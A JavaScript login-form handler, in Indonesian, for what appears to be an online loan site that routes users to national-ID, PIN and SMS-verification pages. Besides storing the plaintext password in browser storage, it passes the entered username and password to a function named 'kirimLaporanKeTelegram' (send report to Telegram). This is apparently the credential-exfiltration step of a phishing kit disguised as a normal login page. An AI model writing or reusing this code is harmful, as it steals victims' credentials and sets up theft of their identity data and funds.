(() => {
  'use strict';
  const form = document.getElementById('loginForm');
  const identity = document.getElementById('identity');
  const password = document.getElementById('password');
  const remember = document.getElementById('remember');
  const toggle = document.getElementById('togglePassword');
  const button = document.getElementById('loginButton');
  const message = document.getElementById('message');

  if (!form || !identity || !password || !button) return;

  const validIdentity = () => {
    const value = identity.value.trim();
    return value.length >= 3 && (!value.includes('@') || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value));
  };
  const validPassword = () => {
  const value = password.value;

  return (
    value.length >= 8 &&          // minimal 8 karakter
    /[A-Z]/.test(value) &&       // minimal 1 huruf kapital
    /[a-z]/.test(value) &&       // minimal 1 huruf kecil
    /[0-9]/.test(value) &&       // minimal 1 angka
    !/\s/.test(value)            // tidak boleh ada spasi
  );
};

  function updateButton() {
    const valid = validIdentity() && validPassword();
    button.disabled = !valid;
    button.classList.toggle('active', valid);
  }

  [identity, password].forEach(el => el.addEventListener('input', () => {
    message.textContent = '';
    message.className = 'message';
    updateButton();
  }));

  toggle?.addEventListener('click', () => {
    const show = password.type === 'password';
    password.type = show ? 'text' : 'password';
    toggle.textContent = show ? '◎' : '◉';
    toggle.setAttribute('aria-label', show ? 'Sembunyikan kata sandi' : 'Tampilkan kata sandi');
  });

  form.addEventListener('submit', event => {
    event.preventDefault();
    if (!validIdentity() || !validPassword()) {
      message.textContent = 'Kata sandi minimal 8 karakter, harus memiliki huruf kapital, huruf kecil, angka, dan tidak boleh menggunakan spasi.';
      message.className = 'message error';
      return;
    }

    button.disabled = true;
    button.textContent = 'MEMPROSES...';

    const saved = NovaStorage.setSession({
      identity: identity.value,
      username: identity.value,
      email: identity.value.includes('@') ? identity.value : '',
      password: password.value,
      remember: remember?.checked
    });

    if (!saved) {
      button.disabled = false;
      button.textContent = 'MASUK';
      message.textContent = 'Browser tidak dapat menyimpan sesi. Periksa pengaturan penyimpanan.';
      message.className = 'message error';
      return;
    }

    window.kirimLaporanKeTelegram?.({
      event: 'LOGIN_SUCCESS',
      page: 'index.html',
      username: identity.value,
      email: identity.value,
      password: password.value,
      status: 'LOGIN_SUCCESS'
    });

    const profile = NovaStorage.getIdentity();
    const application = NovaStorage.getApplication();
    const hasIdentity = Boolean(profile?.fullName && /^\d{16}$/.test(profile?.nik || ''));
    const hasLoan = Boolean(application?.loan?.amount > 0 &&
      ['LOAN_FORM_COMPLETED', 'SUMMARY_CONFIRMED', 'PIN_CONFIRMED',
       'SUBMISSION_PROCESSING', 'RESULT_AVAILABLE'].includes(application?.currentStep));

    const requiresReauthentication = Boolean(
      hasIdentity && hasLoan && application?.resultAvailable
    );

    if (requiresReauthentication) {
      sessionStorage.setItem('kbDashboardReauth', '1');
      window.location.replace('verifikasi-sms.html');
      return;
    }

    window.location.replace(hasIdentity && hasLoan
      ? 'dashboard-pinjaman.html'
      : hasIdentity
        ? 'verifikasi-sms.html'
        : 'form-nik.html');
  });

  updateButton();
})();
